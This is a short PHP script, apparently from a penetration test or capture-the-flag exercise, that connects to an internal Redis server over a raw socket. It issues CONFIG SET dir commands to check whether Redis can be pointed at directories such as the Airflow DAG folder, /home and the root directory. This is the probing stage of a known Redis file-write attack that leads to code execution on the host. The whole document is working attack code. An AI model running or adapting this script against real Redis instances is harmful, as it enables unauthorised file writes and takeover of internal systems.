<?php
function redis_cmd($s, $cmd) {
    fwrite($s, $cmd . "\r\n");
    return trim(fgets($s));
}

$s = fsockopen("172.18.0.3", 6379);
echo redis_cmd($s, "PING") . "\n";
echo "DIR_DAGS:" . redis_cmd($s, "CONFIG SET dir /opt/airflow/dags") . "\n";
echo "DIR_DATA:" . redis_cmd($s, "CONFIG SET dir /data") . "\n";
echo "DIR_TMP:" . redis_cmd($s, "CONFIG SET dir /tmp") . "\n";
echo "DIR_HOME:" . redis_cmd($s, "CONFIG SET dir /home") . "\n";
echo "DIR_ROOT:" . redis_cmd($s, "CONFIG SET dir /") . "\n";
// Get current dir
echo "GET_DIR:" . redis_cmd($s, "CONFIG GET dir") . "\n";
fclose($s);
